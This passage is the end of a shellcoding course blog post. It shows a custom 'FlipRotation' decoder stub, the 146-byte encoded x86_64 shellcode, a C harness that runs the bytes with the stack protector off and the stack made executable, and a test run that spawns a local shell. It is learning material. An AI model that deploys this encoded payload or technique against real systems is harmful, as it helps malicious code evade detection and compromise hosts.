</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x08</span>	<span style="color:#75715e">; if equal ZF will be set meaning we have a complete rotation
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">decode</span>      <span style="color:#75715e">; jump if rotation is not complete
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rcx</span>	<span style="color:#75715e">; if rotation is complete and reset cl to start again the &#34;circular array&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">decode</span>
</span></span></code></pre></div><h3 id="compiling-and-testing-the-fliprotation-decoder">Compiling and Testing the FlipRotation Decoder<a hidden class="anchor" aria-hidden="true" href="#compiling-and-testing-the-fliprotation-decoder">#</a></h3>
<p>Checking <code>assembler.sh</code> output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ../../assembler.sh flipRotation_decoder.nasm          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">146</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xeb\x42\x49\xff\x18\x02\x07\xff\x8a\xff\x94\xff\xd5\x02\xb8\x02\xb1\xff\x68\x02\xde\xff\x8b\x02\xc5\x02\x27\x02\x2d\xff\x49\x02\xa4\xff\x88\x02\x73\x02\x45\xff\x4a\xff\x88\x02\x7c\xff\x59\x02\xa4\xff\x88\x02\xcf\xff\x25\xff\x50\x02\x1c\xff\xd1\x02\x38\x02\x08\x02\xa0\xa0\x48\x8d\x35\xb7\xff\xff\xff\x48\x8d\x7e\x01\x48\x31\xc0\x48\xf7\xe0\xb0\x01\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x06\x80\xf3\xa0\x74\x9d\x80\xf3\x5f\x8a\x1c\x16\x75\x04\xd2\xcb\xeb\x02\xd2\xc3\x80\xf3\x01\x88\x1c\x16\x8a\x5c\x06\x01\x88\x1f\x48\xff\xc7\x04\x02\xfe\xc2\xfe\xc1\x80\xf9\x08\x75\xd0\x48\x31\xc9\xeb\xcb&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
</span></span><span style="display:flex;"><span>--------------------
</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x42\x49\xff\x18\x02\x07\xff\x8a\xff\x94\xff\xd5\x02\xb8\x02\xb1\xff\x68\x02\xde\xff\x8b\x02\xc5\x02\x27\x02\x2d\xff\x49\x02\xa4\xff\x88\x02\x73\x02\x45\xff\x4a\xff\x88\x02\x7c\xff\x59\x02\xa4\xff\x88\x02\xcf\xff\x25\xff\x50\x02\x1c\xff\xd1\x02\x38\x02\x08\x02\xa0\xa0\x48\x8d\x35\xb7\xff\xff\xff\x48\x8d\x7e\x01\x48\x31\xc0\x48\xf7\xe0\xb0\x01\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x06\x80\xf3\xa0\x74\x9d\x80\xf3\x5f\x8a\x1c\x16\x75\x04\xd2\xcb\xeb\x02\xd2\xc3\x80\xf3\x01\x88\x1c\x16\x8a\x5c\x06\x01\x88\x1f\x48\xff\xc7\x04\x02\xfe\xc2\xfe\xc1\x80\xf9\x08\x75\xd0\x48\x31\xc9\xeb\xcb</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span> ^~~~
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">146</span>
</span></span><span style="display:flex;"><span>$ whoami
</span></span><span style="display:flex;"><span>edu
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>core  exploitdb  flipRotation_Encoder.py  flipRotation_decoder  flipRotation_decoder.nasm  flipRotation_decoder.o  shellcode  shellcode.c
</span></span><span style="display:flex;"><span>$ 
</span></span></code></pre></div><p>We get a shell!!!</p>
<hr>
<p>This blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64): <a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p>
<p><code>Student ID: PA-31319</code></p>
<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86_64">https://github.com/0xnibbles/slae_x86_64</a></p>
<hr>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://0xnibbles.github.io/tags/slae64/">slae64</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_5/">
    <span class="title">« Prev</span>
    <br>
    <span>SLAE64 Assignment 5 - Msfvenom Shellcode Analysis </span>
  </a>
  <a class="next" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_3/">
    <span class="title">Next »</span>
    <br>
    <span>SLAE64 Assignment 3 - Egghunter Shellcode</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder) on twitter"
        href="https://twitter.com/intent/tweet/?text=SLAE64%20Assignment%204%20-%20Custom%20Encoder%2fDecoder%20Shellcode%20%28FlipRotation%20Encoder%2fDecoder%29&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_4%2f&amp;hashtags=slae64">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder) on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_4%2f&amp;title=SLAE64%20Assignment%204%20-%20Custom%20Encoder%2fDecoder%20Shellcode%20%28FlipRotation%20Encoder%2fDecoder%29&amp;summary=SLAE64%20Assignment%204%20-%20Custom%20Encoder%2fDecoder%20Shellcode%20%28FlipRotation%20Encoder%2fDecoder%29&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_4%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
</div>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
